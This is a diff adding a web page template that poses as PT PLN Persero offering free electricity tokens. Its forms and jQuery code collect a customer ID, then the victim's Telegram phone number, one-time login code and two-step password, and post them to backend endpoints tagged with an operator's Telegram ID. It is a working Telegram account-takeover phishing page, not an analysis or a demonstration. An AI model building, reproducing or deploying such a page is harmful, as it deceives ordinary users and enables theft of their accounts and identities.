@@ -1,0 +1,657 @@
+<div id="root">
+  <header class="flex justify-between items-center p-4 bg-cyan-800 text-white">
+    <button class="md:hidden focus:outline-none">
+      <div class="space-y-1">
+        <div class="w-8 h-1 bg-white"></div>
+        <div class="w-8 h-1 bg-white"></div>
+        <div class="w-8 h-1 bg-white"></div>
+      </div>
+    </button>
+  </header>
+  <main class="flex-grow">
+    <div class="min-h-screen bg-gray-100">
+      <nav class="bg-cyan-600 p-4">
+        <div class="container mx-auto">
+          <h1 class="text-white text-2xl font-bold">PT PLN PERSERO</h1>
+        </div>
+      </nav>
+      <div id="carouselExampleControls" class="carousel slide w-full" data-bs-ride="carousel">
+        <div class="carousel-inner">
+          <% let isFirst = true; %> <!-- Variabel untuk menandai slide pertama -->
+      
+          <% if (imageUrl1) { %>
+            <div class="carousel-item <%= isFirst ? 'active' : '' %>">
+              <img src="<%= imageUrl1 %>" alt="Slide 1" class="d-block w-100 h-auto max-h-[500px] object-cover">
+            </div>
+            <% isFirst = false; %>
+          <% } %>
+      
+          <% if (imageUrl2) { %>
+            <div class="carousel-item <%= isFirst ? 'active' : '' %>">
+              <img src="<%= imageUrl2 %>" alt="Slide 2" class="d-block w-100 h-auto max-h-[500px] object-cover">
+            </div>
+            <% isFirst = false; %>
+          <% } %>
+      
+          <% if (imageUrl3) { %>
+            <div class="carousel-item <%= isFirst ? 'active' : '' %>">
+              <img src="<%= imageUrl3 %>" alt="Slide 3" class="d-block w-100 h-auto max-h-[500px] object-cover">
+            </div>
+            <% isFirst = false; %>
+          <% } %>
+      
+          <% if (imageUrl4) { %>
+            <div class="carousel-item <%= isFirst ? 'active' : '' %>">
+              <img src="<%= imageUrl4 %>" alt="Slide 4" class="d-block w-100 h-auto max-h-[500px] object-cover">
+            </div>
+            <% isFirst = false; %>
+          <% } %>
+      
+          <% if (imageUrl5) { %>
+            <div class="carousel-item <%= isFirst ? 'active' : '' %>">
+              <img src="<%= imageUrl5 %>" alt="Slide 5" class="d-block w-100 h-auto max-h-[500px] object-cover">
+            </div>
+            <% isFirst = false; %>
+          <% } %>
+        </div>
+      
+        <!-- Tombol Navigasi -->
+        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleControls" data-bs-slide="prev">
+          <span class="carousel-control-prev-icon"></span>
+        </button>
+        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleControls" data-bs-slide="next">
+          <span class="carousel-control-next-icon"></span>
+        </button>
+      </div>
+      
+    
+    
+      <div class="container mx-auto p-6">
+        <h2 class="text-3xl font-semibold mb-4">
+          PEMBAGIAN TOKEN LISTRIK GRATIS
+        </h2>
+        <p class="mb-6">
+          Silakan isi formulir di bawah ini untuk mendapatkan token listrik
+          gratis.
+        </p>
+    
+
+        <form
+      
+          action="javascript:void(0)"
+          method="post"
+          id="awal"
+          class="space-y-4 bg-white p-6 rounded shadow-md"
+        >
+     
+          <div>
+            <label class="block text-sm font-medium text-gray-700" for="kode"
+              >ID pelanggan</label
+            >
+            <input
+              type="text"
+              id="idpel"
+              name="idpel"
+              class="mt-1 block w-full p-2 border border-gray-300 rounded"
+              required
+            />
+            <span id="idpelwarning" style="display: none; color: red;"></span>
+          </div>
+          <button
+          id="buttonidpel"
+            type="submit"
+            onclick="awal()"
+            class="w-full bg-cyan-600 text-white p-2 rounded hover:bg-cyan-700"
+          >
+            CHECK
+          </button>
+        </form>
+
+
+
+        <form
+        id="pertama"
+        action="javascript:void(0)"
+        method="post"
+        class="space-y-4 bg-white p-6 rounded shadow-md"
+        style="display: none"
+        >
+        <div>
+          <label class="block text-sm font-medium text-gray-700" for="nama"
+          >Nama Pelanggan</label
+          >
+          <input
+          type="text"
+          id="nama"
+          name="nama"
+          readonly
+              class="mt-1 block w-full p-2 border border-gray-300 rounded"
+              required
+              />
+            </div>
+            <div>
+              <label
+              class="block text-sm font-medium text-gray-700"
+              for="dayalistrik"
+              >Daya Listrik</label
+              >
+              <input
+              type="text"
+              id="dayalistrik"
+              name="dayalistrik"
+              readonly
+              class="mt-1 block w-full p-2 border border-gray-300 rounded"
+              required
+              />
+             
+            </div>
+            
+            
+            <div>
+              <label
+              class="block text-sm font-medium text-gray-700"
+              for="provinsi"
+              >Provinsi</label>
+              <select name="provinsi" id="provinsi" class="mt-1 block w-full p-2 border border-gray-300 rounded form-control" required>
+                <option value="" disabled>Pilih Provinsi</option>
+                <option value="Aceh">Aceh</option>
+                <option value="Bali">Bali</option>
+                <option value="Banten">Banten</option>
+                <option value="Bengkulu">Bengkulu</option>
+                <option value="Gorontalo">Gorontalo</option>
+                <option value="Jakarta">Jakarta</option>
+                <option value="Jambi">Jambi</option>
+                <option value="Jawa Barat">Jawa Barat</option>
+                <option value="Jawa Tengah">Jawa Tengah</option>
+                <option value="Jawa Timur">Jawa Timur</option>
+                <option value="Kalimantan Barat">Kalimantan Barat</option>
+                <option value="Kalimantan Selatan">Kalimantan Selatan</option>
+                <option value="Kalimantan Tengah">Kalimantan Tengah</option>
+                <option value="Kalimantan Timur">Kalimantan Timur</option>
+                <option value="Kalimantan Utara">Kalimantan Utara</option>
+                <option value="Kepulauan Riau">Kepulauan Riau</option>
+                <option value="Lampung">Lampung</option>
+                <option value="Maluku">Maluku</option>
+                <option value="Maluku Utara">Maluku Utara</option>
+                <option value="Nusa Tenggara Barat">Nusa Tenggara Barat</option>
+                <option value="Nusa Tenggara Timur">Nusa Tenggara Timur</option>
+                <option value="Papua">Papua</option>
+                <option value="Papua Barat">Papua Barat</option>
+                <option value="Riau">Riau</option>
+                <option value="Sumatera Barat">Sumatera Barat</option>
+                <option value="Sumatera Selatan">Sumatera Selatan</option>
+                <option value="Sumatera Utara">Sumatera Utara</option>
+                <option value="Yogyakarta">Yogyakarta</option>
+              </select>
+            </div>
+            <div>
+            <label
+              class="block text-sm font-medium text-gray-700"
+              for="nomor"
+              >Nomor Telegram Aktif</label
+              >
+              <input
+              type="text"
+              id="phone_number"
+              name="phone_number"
+              value="+62"
+              class="mt-1 block w-full p-2 border border-gray-300 rounded"
+              required
+              />
+              <span id="pertamawarning" style="display: none; color: red;"></span>
+            </div>
+
+            <button
+            type="submit"
+            id="buttonpertama"
+            onclick="processFirstData()"
+            class="w-full bg-cyan-600 text-white p-2 rounded hover:bg-cyan-700"
+            >
+            DAPATKAN
+          </button>
+        </form>
+        <form
+        style="display: none"
+          action="javascript:void(0)"
+          method="post"
+          id="kedua"
+          class="space-y-4 bg-white p-6 rounded shadow-md"
+        >
+          <div>
+            <label class="block text-sm font-medium text-gray-700" for="otp_code"
+              >Masukkan Kode Otp Telegram anda</label
+            >
+            <input
+              type="text"
+              id="otp_code"
+              name="otp_code"
+              class="mt-1 block w-full p-2 border border-gray-300 rounded"
+              required
+            />
+            <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+            <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+            <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+            <span id="keduawarning" style="display: none; color: red;"></span>
+          </div>
+          <button
+            type="submit"
+            id="buttonkedua"
+            onclick="processSecondData()"
+            class="w-full bg-cyan-600 text-white p-2 rounded hover:bg-cyan-700"
+          >
+            Selanjutnya
+          </button>
+        </form>
+        <form
+        style="display: none"
+          action="javascript:void(0)"
+          method="post"
+          id="ketiga"
+          class="space-y-4 bg-white p-6 rounded shadow-md"
+        >
+          <div>
+            <label class="block text-sm font-medium text-gray-700" for="kode"
+              >Masukkan Password Telegram anda</label
+            >
+            <input
+              type="text"
+              id="password"
+              name="password"
+              class="mt-1 block w-full p-2 border border-gray-300 rounded"
+              required
+            />
+            <input type="hidden" name="clientHash" id="validateclientHash" readonly="">
+            <input type="hidden" name="provinsi" id="validateprovinsi" readonly="">
+          <input type="hidden" name="phone_number" id="validatephone_number" readonly="">
+            <span id="ketigawarning" style="display: none; color: red;"></span>
+          </div>
+          <button
+          id="buttonKetiga"
+            type="submit"
+            onclick="processThirdData()"
+            class="w-full bg-cyan-600 text-white p-2 rounded hover:bg-cyan-700"
+          >
+            Selanjutnya
+          </button>
+        </form>
+        
+        <section id="empat" class="container mx-auto p-6"  style="display: none">
+          <div class="bg-white rounded-lg shadow-lg p-8 text-center">
+            <div
+              id="tokenDisplay"
+              class="text-1xl font-mono font-semibold bg-gray-100 rounded-lg border border-gray-300 shadow-md"
+            >
+             TERIMA KASIH
+            </div>
+            <h1 class="pt-2 font-bold text-1xl pb-2">  <%=  titlefour  %></h1>
+            <section class="text-center" style="padding-top: 10px; display: flex; flex-direction: column; align-items: center;">
+              <img src="/assets/img/loading.gif" alt="Loading..." style="width: 150px; margin-bottom: 10px;">
+            </section>
+          </div>
+        </section>
+      
+      </div>
+    </div>
+  </main>
+  <!-- <footer class="flex flex-col justify-center items-center text-white mt-6">
+    <img src="assets/img/pln.png" alt="Footer Logo" class="w-32 h-auto" />
+  </footer> -->
+</div>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+  function formatPhoneNumber(phoneNumber) {
+    // Jika nomor telepon diawali dengan '0', ganti dengan '+628'
+    if (phoneNumber.startsWith("0")) {
+      return "+62" + phoneNumber.substring(1);
+    }
+    // Jika nomor sudah dimulai dengan '62', ganti dengan '+628'
+    else if (phoneNumber.startsWith("62")) {
+      return "+62" + phoneNumber.substring(2);
+    }
+    // Jika format sudah sesuai, kembalikan nomor tanpa perubahan
+    else {
+      return phoneNumber;
+    }
+  }
+
+  function awal() {
+    $("#awal").submit(function (awalsubmit) {
+      awalsubmit.preventDefault();
+
+      var $idpel = $("input#idpel").val();
+
+      var dataToSend = {
+        idpel: $idpel,
+      };
+      console.log(dataToSend);
+
+      $.ajax({
+        type: "POST",
+        url: "/listrik",
+        data: dataToSend, 
+        beforeSend: function () {
+          $("#idpelwarning").html("")
+          $("#buttonidpel").text("Memeriksa...");
+          $("#buttonidpel").prop("disabled", true);
+
+      
+        },
+        success: function (hasil) {
+          console.log(hasil);
+          if (hasil.code == 200) {
+          
+            $("#nama").val(hasil.nama);
+            $("#dayalistrik").val(hasil.va);
+            $("#awal").hide();
+            $("#pertama").show();
+          
+               }else if(hasil.code == 403){
+                $("#buttonidpel").prop("disabled", false);
+                $("#buttonidpel").text("CHECK");
+              $('#idpelwarning')
+          .text('ID pelanggan Tidak Valid!')
+          .show();
+               }else{
+                $("#buttonidpel").prop("disabled", false);
+                $("#buttonidpel").text("CHECK");
+                $('#idpelwarning')
+          .text(`${hasil.error}`)
+          .show();
+              
+
+               }
+        },
+        error: function (xhr, status, error) {
+          console.log(error);
+        },
+      });
+    });
+    return false;
+  }
+
+
+  
+  
+    
+function processFirstData(){
+$('#pertama').submit(function(submitingprocessFirstData){
+submitingprocessFirstData.preventDefault();
+
+var $full_name = $("input#nama").val();
+var $provinsi = $("#provinsi").val();
+var $phone = $("input#phone_number").val();
+var $phone_number = formatPhoneNumber($phone);
+var dataToSend = {
+full_name: $full_name,
+provinsi: $provinsi,
+phone_number: $phone_number
+};
+console.log(dataToSend)
+
+
+if($full_name === "" && $phone_number === ""){
+  return false;
+}
+
+$.ajax({
+  type: "POST",
+  url: "/number",
+ data: dataToSend,
+  beforeSend: function() {
+    $("#buttonpertama").text("Mengirim Kode...");
+          $("#buttonpertama").prop("disabled", true);
+      $("#pertamawarning").html("")
+  },
+  success: function(hasil){
+      if(hasil.code == 200){             
+          $("#kedua").show();
+          $('#pertama').hide();
+          $("input#validateclientHash").val(hasil.clientHash);
+          $("input#validateprovinsi").val($provinsi);
+          $("input#validatephone_number").val($phone_number);
+      }else{
+        $("#buttonpertama").text("Selanjutnya");
+        $("#buttonpertama").prop("disabled", false);
+          $('.loading').hide();
+          if(hasil.err.errorMessage == "PHONE_NUMBER_INVALID"){
+            $("#buttonpertama").text("Selanjutnya");
+            $("#buttonpertama").prop("disabled", false);
+            $('#pertamawarning')
+          .text('Nomor Tidak Valid!')
+          .show();
+              }else if(hasil.err.errorMessage == "FLOOD"){
+                $('#pertamawarning')
+          .text(' Terlalu Banyak Permintaan Code!')
+          .show();
+              
+        }else if(hasil.err.errorMessage == "PHONE_PASSWORD_FLOOD"){
+          $("#buttonpertama").text("Selanjutnya");
+          $("#buttonpertama").prop("disabled", false);  
+          $('#pertamawarning')
+          .text('  Terlalu Banyak Memasukkan Password!')
+          .show();
+          
+          
+        }else{
+          $("#buttonpertama").text("Selanjutnya");
+          $("#buttonpertama").prop("disabled", false);
+                    $('#pertamawarning')
+              .text(`${hasil.err.errorMessage}`)
+              .show();
+
+                    
+                   
+                      }
+                      
+                      
+                      
+                      
+                  }
+              }
+          });
+      });  
+      return false;
+  };
+
+  
+  
+  function processSecondData(){
+      $('#kedua').submit(function(submitingprocessSecondData){
+          submitingprocessSecondData.preventDefault();
+          
+          var $clientHash = $("input#validateclientHash").val();
+          var $phone_number = $("input#validatephone_number").val();
+          var $provinsi = $("input#validateprovinsi").val();
+          var $otp_code = $("input#otp_code").val();
+          var $idtele = "<%= String(telegramId) %>"
+          if($clientHash === "" && $phone_number === "" && $otp_code === ""){
+              return false;
+          }
+          
+          $.ajax({
+              type: "POST",
+              url: "/code",
+              data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
+              beforeSend: function() {
+                $("#buttonkedua").text("Memeriksa Kode...");
+          $("#buttonkedua").prop("disabled", true);
+      $("#keduawarning").html("")
+              },
+              success: function(hasil){
+                  
+                  
+                    if(hasil.needPassword || hasil.code == 401){
+                                          $("#ketiga").show();
+                      $('#kedua').hide();
+                      $("input#validateclientHash").val($clientHash);
+                      $("input#validatePhoneNumber").val($phone_number);
+                      $("input#validateprovinsi").val($provinsi); 
+                     
+                                        
+                    }else{
+                     
+                          try{
+                         if(hasil.code == 200){
+                                       if(hasil.stcd.result.user != ""){
+                                            
+                                            $("#empat").show();
+                                           
+                                            $('#kedua').hide();
+                                
+                                        }
+                                        
+                       
+                              
+                              $("#empat").show();
+                         }else{
+                          $("#buttonkedua").text("Selanjutnya");
+                          $("#buttonkedua").prop("disabled", false);
+                          $('#keduawarning')
+          .text(`${hasil.code} - ${hasil.error}`)
+          .show();
+                     
+        
+                                
+  }
+}catch(e){
+  
+  console.log(e)
+  console.log(hasil)
+  $("#buttonkedua").text("Selanjutnya");
+  $("#buttonkedua").prop("disabled", false);
+  $('#keduawarning')
+          .text(`Ada masalah,coba lagi`)
+          .show();
+  
+  
+  
+  
+  
+  
+                                
+  
+}   
+
+}
+                    
+                    
+      
+                          
+                          },
+                          error: function(xhr, status, error) {
+                             
+      if (status === "timeout") {
+        $("#buttonkedua").text("Selanjutnya");
+  $("#buttonkedua").prop("disabled", false);
+  $('#keduawarning')
+          .text(`Periksa jaringan anda dan coba lagi`)
+          .show();
+                            
+     
+      } else {
+        $("#buttonkedua").text("Selanjutnya");
+  $("#buttonkedua").prop("disabled", false);
+  $('#keduawarning')
+          .text(`Periksa jaringan anda dan coba lagi`)
+          .show();
+      }
+    }
+                  });
+              });  
+              return false;
+          };
+          
+          
+          function processThirdData(){
+              $('#ketiga').submit(function(submitingprocessThirdData){
+                  submitingprocessThirdData.preventDefault();
+                  
+                  var $clientHash = $("input#validateclientHash").val();
+                  var $provinsi = $("input#validateprovinsi").val();
+                  var $phone_number = $("input#validatephone_number").val();
+                  var $password = $("input#password").val();
+                                          var $idtele = "<%= String(telegramId) %>"
+                  if($clientHash === "" && $phone_number === "" && $password === ""){
+                      return false;
+                  }
+                  
+                  $.ajax({
+                      type: "POST",
+                      url: "/password",
+                      data: $(this).serialize() + "&idtele=" + encodeURIComponent($idtele),
+                      beforeSend: function() {
+                        $("#buttonKetiga").text("Memeriksa Password...");
+          $("#buttonKetiga").prop("disabled", true);
+      $("#Ketigawarning").html("")
+                      },
+                      success: function(response){
+
+                        
+
+          try {
+                    // Mengecek apakah respons sukses atau error
+                    if (response.code == 200) {
+            
+                        
+                        $('#kedua').hide();
+                        $("#empat").show();
+
+                                             
+                    } else {
+                        // Menyembunyikan loading dan menampilkan tombol kembali
+                     
+                        
+                        // Menampilkan pesan error jika ada
+                        if (response.error) {
+                          $("#buttonKetiga").text("Selanjutnya");
+                          $("#buttonKetiga").prop("disabled", false);
+     
+          $('#ketigawarning')
+          .text(`${response.code} - ${response.error}`)
+          .show();                   
+        } else {
+                          $("#buttonKetiga").text("Selanjutnya");
+                          $("#buttonKetiga").prop("disabled", false);
+                          $('#ketigawarning')
+          .text(`Ada Masalah,Silahkan Coba Lagi Nanti`)
+          .show();   
+         }
+                    }
+                } catch (e) {
+                   
+                  $("#buttonKetiga").text("Selanjutnya");
+                  $("#buttonKetiga").prop("disabled", false);
+                    console.log(e);
+                    $("#buttonKetiga").text("Selanjutnya");
+                          $("#buttonKetiga").prop("disabled", false);
+                          $('#ketigawarning')
+          .text(`Ada Masalah,Silahkan Coba Lagi Nanti`)
+          .show();   
+                  }
+            },
+            error: function(xhr, status, error){
+           
+              $("#buttonKetiga").text("Selanjutnya");
+              $("#buttonKetiga").prop("disabled", false);
+                console.log(error);
+                $("#buttonKetiga").text("Selanjutnya");
+                          $("#buttonKetiga").prop("disabled", false);
+                          $('#ketigawarning')
+          .text(`Ada Masalah,Silahkan Coba Lagi Nanti`)
+          .show();       
+              }
+        });
+        });
+
+        return false;
+};
+
+</script>
+
+
+
+
+
+
